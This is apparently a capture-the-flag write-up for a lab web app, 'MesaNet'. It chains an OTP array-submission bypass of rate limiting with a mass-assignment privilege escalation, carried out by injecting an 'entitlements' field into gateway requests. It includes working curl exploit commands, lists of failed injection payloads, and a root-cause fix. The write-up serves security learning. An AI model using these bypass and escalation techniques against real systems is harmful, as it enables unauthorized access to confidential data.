---
title: MesaNet - HARD
tags:
  - bugforge
  - broken-access-control
  - otp-bypass
  - gateway
  - entitlement-override
---

- The hardest BugForge challenge I've done. 15 sessions, hundreds of requests, and the flag was hiding behind a single top-level JSON field in the gateway request body. A masterclass in broken access control through permission source confusion.

- **Difficulty:** Hard (Weekly Challenge)
- **Theme:** Half-Life / Black Mesa Research Facility
- **Tools:** Burp + Claude Code with Burp MCP + a LOT of curl ...

---

## TL;DR

- OTP verification endpoint accepts a JSON array of all 10,000 possible codes in a single request, bypassing rate limiting.
- After dev console access, create users with custom entitlements to map the permission model.
- The gateway forwards the full request body to backend microservices - including attacker-controlled fields.
- Adding `"entitlements"` at the top level of the gateway POST body overrides the session-derived permissions, escalating a low-privilege user to full confidential read access and revealing the flag.

**Attack Chain:**
```
OTP Array Bypass --> Dev Console --> User Provisioning --> Map Entitlement Model -->
Gateway Body Pollution (entitlements override) --> Privilege Escalation --> Flag
```

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [OTP Array Bypass](#2-otp-array-bypass)
3. [Dev Console & User Provisioning](#3-dev-console--user-provisioning)
4. [Gateway Architecture](#4-gateway-architecture)
5. [Mapping the Permission Model](#5-mapping-the-permission-model)
6. [The Hunt -- What Didn't Work](#6-the-hunt----what-didnt-work)
7. [The Breakthrough -- Entitlements Override](#7-the-breakthrough----entitlements-override)
8. [Flag](#8-flag)
9. [Root Cause Analysis](#9-root-cause-analysis)
10. [Key Takeaways](#10-key-takeaways)

---

## 1. Reconnaissance

### Initial Login

The app presents a Half-Life themed intranet login. Default credentials `operator:operator` are provided.

Login and capture the session cookie:

```bash
# Login and extract the session cookie
curl -sk -D - -o /dev/null -X POST "https://<LAB>/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=operator&password=operator"
```

Response: `302 Found` with a `connect.sid` session cookie in the `Set-Cookie` header.

Save the cookie for all subsequent requests:

```bash
# Copy the connect.sid value from the Set-Cookie header above
export LAB="https://<YOUR-LAB-URL>"
export COOKIE="connect.sid=s%3A<YOUR_SESSION_VALUE>"
```

> **Note:** Every command below uses `$LAB` and `$COOKIE`. Set these once and everything is copy-pasteable.

### Dashboard

After login, browse to the dashboard to see the available applications:

```bash
curl -sk -b "$COOKIE" "$LAB/" | grep -oP 'href="[^"]*"' | sort -u
```

Four apps are visible:

| App | Path | Description |
|-----|------|-------------|
| Nexus | /apps/nexus | Notes/document management |
| Secure Mail | /apps/mail | Internal messaging |
| Rail Transit | /apps/rail | Facility transit system |
| Personnel | /apps/personnel | Staff directory |

Plus a locked **Dev Console** at `/dev` requiring an OTP.

### Users and Clearance Levels

The personnel directory is accessible through the gateway. List all staff:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "e5b2c8a3-9d4f-4e1b-8c7a-2f6d1a9e3b5c",
    "endpoint": "/api/personnel/list",
    "data": {}
  }'
```

This reveals 15 employees across 6 departments, each with a clearance level (L1-L5):

| User | Clearance | Role |
|------|-----------|------|
| breen | L5 | Director of Research |
| kleiner | L4 | Senior Researcher |
| vance | L4 | Senior Researcher |
| operator (us) | L3 | System Operator |
| researcher | L2 | Researcher |
| security | L1 | Security Guard |

### Seeded Data

List all notes visible to the operator:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e",
    "endpoint": "/api/notes/list",
    "data": {}
  }'
```

The operator has `read: ["public", "restricted"]` entitlements on Nexus, plus ownership access:

**Notes** (5 seeded):

| ID | Owner | Classification | Readable by operator? |
|----|-------|---------------|----------------------|
| 1 | operator | public | Yes |
| 2 | researcher | restricted | Yes |
| 3 | operator | confidential | Yes (owner only) |
| 4 | researcher | public | Yes |
| 5 | operator | restricted | Yes |

Check the mail inbox:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "b3e8d1f6-4c9a-4b2e-8f7d-6a1c9b3e5f8d",
    "endpoint": "/api/mail/inbox",
    "data": {}
  }'
```

**Mail** (4 seeded): Standard inter-office messages. No flags in any bodies.

---

## 2. OTP Array Bypass

The dev console at `/dev` requires a 4-digit OTP with 10 attempts per rotation window. The classic approach is brute force, but the rate limit makes that impractical.

### The Vulnerability

The `/dev/verify` endpoint accepts JSON input. When the `otp` field is a JSON array instead of a string, the server iterates through every element and checks each one. The entire array counts as a single rate-limit attempt.

### Exploit

Step 1 - Generate all 10,000 possible 4-digit codes:

```bash
python3 -c "
import json
payload = {'otp': [str(i).zfill(4) for i in range(10000)]}
with open('/tmp/otp-array.json', 'w') as f:
    json.dump(payload, f)
print(f'Payload size: {len(json.dumps(payload))} bytes')
"
```

Step 2 - Send the array to the OTP endpoint:

```bash
curl -sk -D - -o /dev/null -X POST "$LAB/dev/verify" \
  -H "Content-Type: application/json" \
  -H "Cookie: $COOKIE" \
  -d @/tmp/otp-array.json
```

The payload is ~80KB, well under the Express default 100KB body limit.

**Response:** `302 Found -> Location: /dev` -- we're in.

Your session cookie now has dev console access. No need to re-export `$COOKIE`.

### Why This Works

The server-side code likely does something like:

```javascript
// Pseudocode
const otp = req.body.otp;
if (Array.isArray(otp)) {
    for (const code of otp) {
        if (code === currentOtp) return success();
    }
}
```

One of the 10,000 values matches the current OTP. The rate limiter increments by 1 (one request), not by 10,000 (number of codes tested).

---

## 3. Dev Console & User Provisioning

### What /dev Gives You

After OTP bypass, browse the dev console:

```bash
curl -sk -b "$COOKIE" "$LAB/dev"
```

It provides:
- **Gateway documentation** -- how the gateway routes requests to backends
- **User creation endpoint** -- `POST /api/dev/users` with custom entitlements
- **Entitlement specification** at `/dev/spec`
- **Example payloads** at `/dev/examples`

### Entitlement Spec

From `/dev/spec` -- these are the fields the app understands:

```
nexus:
  access:              true | false  (required -- gateway returns 403 without it)
  read:                ["public", "restricted", "confidential"]
  write:               ["public", "restricted", "confidential"]

mail:
  access:              true | false  (required)
  canSend:             true | false
  maxClassification:   "public" | "restricted" | "confidential"
```

### User Creation API

Create a user with custom entitlements:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/api/dev/users" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "testuser",
    "password": "password123",
    "fullName": "Test User",
    "clearanceLevel": 5,
    "entitlements": {
      "nexus": {
        "access": true,
        "read": ["public", "restricted", "confidential"],
        "write": ["public", "restricted", "confidential"]
      },
      "mail": {
        "access": true,
        "canSend": true,
        "maxClassification": "confidential"
      }
    }
  }'
```

Key observations:
- Mass assignment works: extra entitlement fields are accepted and stored
- Server assigns sequential user IDs (no ID control)
- `clearanceLevel` accepts 0-5 (and the server doesn't enforce the spec limits)
- `access: true` is **required** for the gateway to forward requests to a service -- without it, you get `403 Access denied`

---

## 4. Gateway Architecture

All API communication goes through a central gateway:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "<APP_UUID>",
    "endpoint": "/api/<path>",
    "data": {}
  }'
```

### App UUIDs

Found in the client-side JavaScript (`/public/js/nexus-client.js`, `/public/js/mail-client.js`) and on the `/dev` page:

| App | UUID | Backend |
|-----|------|---------|
| Nexus | `a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e` | Node.js (notes) |
| Mail | `b3e8d1f6-4c9a-4b2e-8f7d-6a1c9b3e5f8d` | Go (mail) |
| Rail | `c3e8a1f6-4c9a-4b2e-8f6d-6a1c9b3e5f8d` | Go (transit) |
| Personnel | `e5b2c8a3-9d4f-4e1b-8c7a-2f6d1a9e3b5c` | Go (personnel) |

### Gateway Flow

```
Client --> POST /gateway --> Gateway validates:
  1. Session authenticated?
  2. App UUID registered?
  3. Endpoint starts with /api/?
  4. User has entitlements.<service>.access == true?
--> Forward to backend microservice
```

The gateway forwards the request to the appropriate backend. The backend then applies its own permission checks (e.g., checking the user's `read` array against note classifications).

### Reverse-Engineered Notes Query

```sql
SELECT * FROM notes WHERE classification IN (read_array) OR ownerId = user.id
```

- `read_array` comes from the user's entitlements
- Users always see their OWN notes regardless of classification
- Values are parameterized (no SQL injection)

---

## 5. Mapping the Permission Model

To understand the permission model, I created users at every clearance level and with various entitlement configurations using the `/api/dev/users` endpoint from Section 3.

### Clearance Level Test (L0-L5)

Created 6 users, all with `read: ["public","restricted","confidential"]` but different clearance levels:

| User | Level | Read Array | Notes Visible |
|------|-------|-----------|---------------|
| level0user | L0 | public, restricted, confidential | 5 (all seeded) |
| level1user | L1 | public, restricted, confidential | 5 |
| level2user | L2 | public, restricted, confidential | 5 |
| level3user | L3 | public, restricted, confidential | 5 |
| level4user | L4 | public, restricted, confidential | 5 |
| level5user | L5 | public, restricted, confidential | 5 |

**Finding:** Clearance level does NOT filter notes. The `read` array in entitlements is the only access control for note visibility.

### Entitlement Edge Cases

| User | Config | Result |
|------|--------|--------|
| emptyread | read: [] | 0 notes (empty array = no access) |
| wildcard1 | read: ["*"] | 0 notes (wildcard not expanded) |
| noread1 | no read field | 0 notes |
| stringread | read: "confidential" (string) | 3 confidential notes (works) |
| superreader | read: 60+ values | Same 5 notes (no hidden classifications) |

**Finding:** The read array uses exact string matching against the classification column. Only "public", "restricted", and "confidential" exist in the database.

### Write Permissions

| User | Write Array | Can Create Restricted? | Can Create Confidential? |
|------|------------|----------------------|------------------------|
| operator (L3) | ["public"] | No -- "Insufficient permissions" | No |
| L5 created user | ["public","restricted","confidential"] | Yes | Yes |

**Finding:** Write permissions are server-side enforced, not just client-side UI.

---

## 6. The Hunt -- What Didn't Work

This is the section that took 14 sessions and hundreds of requests. Everything below was tested and eliminated.

### SQL Injection (ALL Parameterized)

| Injection Point | Result |
|----------------|--------|
| Login (username/password) | No error |
| User creation (all 5 fields) | No error |
| notes/create (title, body, classification) | No error |
| notes/get, mail/get (id field) | No error |
| mail/send (toUsername) | No error |
| personnel/get (id) | No error |
| Gateway UUID (id) | Hash lookup, not SQL |
| rail/create (message) | Stored literally (parameterized in v2) |
| nexus.read array values | Parameterized |
| UNION, tautology, boolean, stacked queries | All dead |

### NoSQL Injection

| Payload in read array | Result |
|----------------------|--------|
| `{"$gt":""}` | 0 notes |
| `{"$ne":null}` | 0 notes |
| `{"$regex":".*"}` | 0 notes |

Backend is SQL (SQLite), not MongoDB. Objects are stringified, not parsed as operators.

### Gateway Manipulation

| Technique | Result |
|-----------|--------|
| Path traversal (`/api/../flag`) | "Endpoint not found" |
| Query string in endpoint | 404 |
| Cross-service routing (nexus UUID + mail endpoint) | 404 (separate services) |
| Dev UUIDs (111.../222...) | "Unknown application ID" |
| Extra top-level fields (generic names) | No effect |
| userId/user overrides in body | No effect |
| X-User-Id, X-Forwarded-User headers (7+ variants) | No identity override |
| X-HTTP-Method-Override | No effect |
| Double encoding, null bytes, CRLF | All normalized |
| HPP duplicate params | Last key wins / array |
| Prototype pollution (__proto__, constructor) | No effect |
| HTTP methods GET/PUT/PATCH/DELETE on /gateway | All 404 |
| Content-Type XML/text/plain | Not parsed |

### Entitlement Manipulation

| Technique | Result |
|-----------|--------|
| admin, readAll, bypass, override fields | Stored, ignored by backend |
| userId/ownerId in entitlements | Backend identity unchanged |
| Top-level admin/role/isAdmin | Stored, ignored |
| UUID-keyed entitlements for dev services | Dev UUIDs still "Unknown" |

### Data Field Overrides on notes/list

| Field in data | Result |
|--------------|--------|
| read: ["confidential"] | Same notes |
| classification: "confidential" | Same notes |
| ownerId: 4 (breen) | Same notes |
| userId: 4 | Same notes |
| where: {}, filter: {} | Same notes |
| includeAll, listAll, showAll: true | Same notes |

### Session Manipulation

- 83 session secrets tested for cookie forgery (LAMBDA-0451, blackmesa, Half-Life themed, common Express defaults) -- none matched

### Classification Brute Force

- 100+ classification values in read array (all HL-themed, security-themed, Greek letters, numeric, NATO phonetic) -- still only 5 seeded notes exist

### Hidden Endpoints

- 20+ paths fuzzed on `/dev/*` (GET + POST)
- 22+ paths fuzzed on `/api/dev/*`
- 14+ CRUD names on nexus, mail
- 9+ on personnel, 6+ on rail
- Auth, password reset, DB management endpoints
- WebSocket, SSE, socket.io
- Source code exposure (.git, .env, package.json)

**All 404.**

### Other Dead Ends

- Breen password (60+ guesses across all seeded users)
- IDOR on notes/get (classification + ownership enforced)
- Race conditions on notes/create (no special behavior)
- Mail to breen (no auto-response)
- Dev page identical for L3 vs L5 users
- `id: true` type coercion on gateway reaches Rail only

---

## 7. The Breakthrough -- Entitlements Override

### The Hint

> "If you had a low priv user, and you tried to access something that is forbidden, how might you change that request to gain access? Sometimes apps read permissions from multiple places or fall back to different sources."

This pointed directly at **request-level permission injection**. The backend reads entitlements from the session, but also accepts them from the request body as a fallback.

### Step 1 -- Create a Low-Privilege User

Using the operator session (with dev console access), create a user with only public read:

```bash
curl -sk -b "$COOKIE" -X POST "$LAB/api/dev/users" \
  -H "Content-Type: application/json" \
  -d '{
    "username": "lowpriv",
    "password": "lowpriv123",
    "fullName": "Low Priv User",
    "clearanceLevel": 1,
    "entitlements": {
      "nexus": {
        "access": true,
        "read": ["public"],
        "write": ["public"]
      },
      "mail": {
        "access": true,
        "canSend": true,
        "maxClassification": "public"
      }
    }
  }'
```

### Step 2 -- Login as the Low-Privilege User

```bash
# Login as lowpriv and capture the session cookie
curl -sk -D - -o /dev/null -X POST "$LAB/login" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=lowpriv&password=lowpriv123"
```

Save the new session cookie:

```bash
# Copy the connect.sid value from the Set-Cookie header above
export LOW_COOKIE="connect.sid=s%3A<LOWPRIV_SESSION_VALUE>"
```

### Step 3 -- Confirm Limited Access (Baseline)

List notes as the low-priv user:

```bash
curl -sk -b "$LOW_COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e",
    "endpoint": "/api/notes/list",
    "data": {}
  }'
```

**Response:** Only 2 notes (public classification):

```json
{
    "notes": [
        {"id": 1, "classification": "public", "title": "Anomalous Materials Lab..."},
        {"id": 4, "classification": "public", "title": "Headcrab Specimen Observations"}
    ]
}
```

Restricted (IDs 2, 5) and confidential (ID 3) notes are filtered out. The access control is working.

### Step 4 -- The Exploit

Same request, same user, same session -- but add `"entitlements"` as a **top-level field** in the gateway POST body, alongside `id`, `endpoint`, and `data`:

```bash
curl -sk -b "$LOW_COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e",
    "endpoint": "/api/notes/list",
    "data": {},
    "entitlements": {
      "nexus": {
        "access": true,
        "read": ["public", "restricted", "confidential"]
      }
    }
  }'
```

**Response:** All 5 notes + the flag:

```json
{
    "notes": [
        {"id": 1, "classification": "public", "title": "Anomalous Materials Lab..."},
        {"id": 2, "classification": "restricted", "title": "Xen Crystal Analysis..."},
        {"id": 3, "classification": "confidential", "title": "Lambda Complex Access Codes"},
        {"id": 4, "classification": "public", "title": "Headcrab Specimen Observations"},
        {"id": 5, "classification": "restricted", "title": "G-Man Sightings Log"}
    ],
    "flag": "bug{kiC0QoPDolKV7rqvQ6NzI3aSZW3nSGvu}"
}
```

### What Didn't Work (Same Request, Different Field Names)

To be precise about what triggers the override vs what gets ignored:

| Top-level field | Result |
|----------------|--------|
| `"entitlements": {"nexus": {"read": [...]}}` | **ALL 5 NOTES + FLAG** |
| `"read": ["public","restricted","confidential"]` | 2 notes (ignored) |
| `"clearanceLevel": 5` | 2 notes (ignored) |
| `"role": "admin"` | 2 notes (ignored) |
| `"user": {"clearanceLevel": 5, ...}` | 2 notes (ignored) |

And in the `data` field:

| data field | Result |
|-----------|--------|
| `"entitlements": {"nexus": {"read": [...]}}` | 2 notes (ignored) |
| `"read": ["public","restricted","confidential"]` | 2 notes (ignored) |
| `"clearanceLevel": 5` | 2 notes (ignored) |

**Only `entitlements` at the gateway body top level works.** Not in `data`. Not with other field names.

---

## 8. Flag

One-liner to extract the flag (using the low-priv session):

```bash
curl -sk -b "$LOW_COOKIE" -X POST "$LAB/gateway" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "a7f3c4e9-8b2d-4a6f-9c1e-5d8a3b7f2c4e",
    "endpoint": "/api/notes/list",
    "data": {},
    "entitlements": {
      "nexus": {
        "access": true,
        "read": ["public", "restricted", "confidential"]
      }
    }
  }' | python3 -m json.tool | grep flag
```

```
"flag": "bug{kiC0QoPDolKV7rqvQ6NzI3aSZW3nSGvu}"
```

---

## 9. Root Cause Analysis

### The Permission Source Confusion

The gateway receives the client's POST body:

```json
{"id": "...", "endpoint": "/api/notes/list", "data": {}, "entitlements": {...}}
```

When the gateway forwards the request to the backend microservice, it constructs a new payload. The likely implementation:

```javascript
// Gateway forwarding (pseudocode)
const payload = {
    userId: req.session.userId,
    entitlements: req.session.entitlements,
    ...req.body  // <-- Client body spread AFTER session fields
};

// Forward to backend
axios.post(backendUrl + req.body.endpoint, payload);
```

Because the client body is spread **after** the session-derived entitlements, any `entitlements` field in the request body overwrites the session's entitlements. The backend then uses the attacker-supplied permissions for its access control checks.

### Why `data.entitlements` Didn't Work

The gateway likely extracts `data` separately and sends it as a nested field. Only top-level fields in the request body participate in the destructive spread that overwrites session properties.

### CWE Classification

| CWE | Description |
|-----|-------------|
| CWE-285 | Improper Authorization -- permissions not properly validated |
| CWE-639 | Authorization Bypass Through User-Controlled Key |
| CWE-915 | Improperly Controlled Modification of Dynamically-Determined Object Attributes |

### CVSS

**CVSS 3.1: 8.8 (High)** -- Any authenticated user can escalate to any permission level by injecting entitlements into the gateway request body. No special conditions required.

---

## 10. Key Takeaways

### 1. Never Trust the Request Body for Authorization

The gateway trusted client-supplied fields alongside session-derived data. Authorization should come from the session/token only, never from the request body. The fix is to explicitly whitelist which fields from the client body get forwarded:

```javascript
// FIXED: only forward known-safe fields
const payload = {
    userId: req.session.userId,
    entitlements: req.session.entitlements,  // Always from session
    data: req.body.data  // Only the data field from client
};
```

### 2. Object Spread Order Matters

`{...sessionData, ...clientBody}` means the client wins on key conflicts. This is the JavaScript equivalent of mass assignment in Rails/Django. Always spread trusted data last, or better yet, don't spread untrusted input at all.

### 3. Exact Field Names Matter for Testing

I tested generic override names (`admin`, `role`, `bypass`, `read`) early in the engagement. They all failed. The actual vulnerable field was `entitlements` -- the exact field name the backend expects. When testing parameter pollution, always use the real field names from the application's own data model.

### 4. OTP Array Injection is a Real Pattern

If a verification endpoint accepts JSON, always test whether the field accepts an array. Servers that iterate without counting iterations are common. This bypassed a 10-attempt rate limit with a single 80KB request.

### 5. Elimination is Progress

14 sessions of "nothing works" felt frustrating but each eliminated test narrowed the search space. By the time the hint arrived, the answer was clear: it had to be request-level permission injection, because everything else was dead.

### Vulnerability Summary

| # | Vulnerability | Impact | CVSS |
|---|--------------|--------|------|
| 1 | OTP Array Bypass | Dev console access, rate limit bypass | 7.5 |
| 2 | Entitlements Override via Gateway Body | Full privilege escalation, read all data | 8.8 |

---

## Full Attack Chain

```
    Login (operator:operator)
            |
    POST /dev/verify
    {"otp":["0000"..."9999"]}        <-- OTP array bypass
            |
    Dev Console (/dev)
            |
    POST /api/dev/users              <-- Create low-priv user
    {"clearanceLevel":1, "entitlements":{"nexus":{"read":["public"]}}}
            |
    Login as low-priv user
            |
    POST /gateway                    <-- Normal request: 2 public notes
    {"id":"nexus-uuid","endpoint":"/api/notes/list","data":{}}
            |
    POST /gateway                    <-- Entitlements override: ALL notes + flag
    {"id":"nexus-uuid","endpoint":"/api/notes/list","data":{},
     "entitlements":{"nexus":{"access":true,"read":["public","restricted","confidential"]}}}
            |
        bug{kiC0QoPDolKV7rqvQ6NzI3aSZW3nSGvu}
```
